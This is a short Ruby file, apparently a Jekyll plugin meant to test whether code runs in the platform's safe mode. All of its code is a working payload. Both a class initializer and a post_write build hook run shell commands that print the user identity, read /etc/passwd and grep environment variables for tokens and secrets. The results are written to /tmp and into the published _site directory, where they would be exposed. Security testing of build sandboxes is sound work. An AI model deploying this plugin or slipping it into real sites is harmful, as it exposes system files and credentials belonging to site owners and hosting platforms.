# This should NOT execute in safe mode
# If it does, it's an RCE
module Jekyll
  class RCETest
    def initialize
      output = `id && whoami && cat /etc/passwd && env | grep -i "token\|secret\|github" 2>/dev/null`
      File.open('/tmp/rce_confirmed.txt', 'w') { |f| f.write(output) }
      puts "[RCE_CONFIRMED] #{output}"
    end
  end
end

Jekyll::Hooks.register :site, :post_write do |site|
  output = `id && whoami && cat /etc/passwd 2>/dev/null && env | grep -i "token\|secret\|github" 2>/dev/null`
  File.write('_site/rce_output.txt', output)
  puts "[RCE_HOOK_EXECUTED] #{output.lines.first}"
end
